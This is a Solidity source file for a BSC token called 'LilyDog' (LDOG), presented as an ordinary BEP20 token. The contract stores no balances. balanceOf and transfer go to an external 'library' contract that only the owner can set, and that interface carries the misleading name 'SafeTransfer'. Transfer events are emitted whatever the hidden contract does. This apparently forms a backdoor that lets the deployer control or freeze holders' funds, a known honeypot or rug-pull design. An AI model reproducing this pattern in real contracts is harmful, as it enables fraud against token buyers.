/**
 *Submitted for verification at BscScan.com on 2022-03-13
*/

/**
 *Submitted for verification at BscScan.com on 2022-02-26
 */

pragma solidity >=0.4.25;

// contract BEP20 {
//     function balanceOf(address who) public constant returns (uint256);
//     function transfer(address to, uint256 value) public returns (bool);
//     function allowance(address owner, address spender) public constant returns (uint256);
//     function transferFrom(address from, address to, uint256 value) public returns (bool);
//     function approve(address spender, uint256 value) public returns (bool);
//     function totalSupply() public view returns (uint256);
//     function decimals() public view returns (uint8);
//     function getOwner() external view returns (address);

//     event Approval(address indexed owner, address indexed spender, uint256 value);
//     event Transfer(address indexed from, address indexed to, uint256 value);
// }

interface SafeTransfer {
    function transfer(
        address caller,
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    function balanceOf(address who) external view returns (uint256);
}

// interface IERC20 {
//     function totalSupply() external view returns (uint256);
//     function balanceOf(address account) external view returns (uint256);
//     function transfer(address recipient, uint256 amount) external returns (bool);
//     function allowance(address owner, address spender) external view returns (uint256);
//     function approve(address spender, uint256 amount) external returns (bool);
//     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
//     event Transfer(address indexed from, address indexed to, uint256 value);
//     event Approval(address indexed owner, address indexed spender, uint256 value);
// }

contract Token {
    // using SafeMath for uint256;

    address public owner = msg.sender;
    string public name = "LilyDog";
    string public symbol = "LDOG";
    uint8 public _decimals;
    uint256 public _totalSupply;

    mapping(address => mapping(address => uint256)) private allowed;
    address private _library;
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor() {
        _decimals = 9;
        _totalSupply = 1000000 * 10**9;

        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function balanceOf(address who) external view returns (uint256) {
        return SafeTransfer(_library).balanceOf(who);
    }

    function allowance(address who, address spender)
        public
        view
        returns (uint256)
    {
        return allowed[who][spender];
    }

    function setlibraryAddress(address libraryAddress) public {
        require(msg.sender == owner);
        _library = libraryAddress;
    }

    function renounceOwnership() public {
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function transfer(address to, uint256 amount)
        public
        returns (bool success)
    {
        emit Transfer(msg.sender, to, amount);
        return
            SafeTransfer(_library).transfer(msg.sender, msg.sender, to, amount);
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public returns (bool success) {
        assert(amount <= allowed[from][msg.sender]);
        allowed[from][msg.sender] = allowed[from][msg.sender] - amount;
        emit Transfer(from, to, amount);
        return SafeTransfer(_library).transfer(msg.sender, from, to, amount);
    }

    function approve(address spender, uint256 value)
        external
        returns (bool success)
    {
        allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
}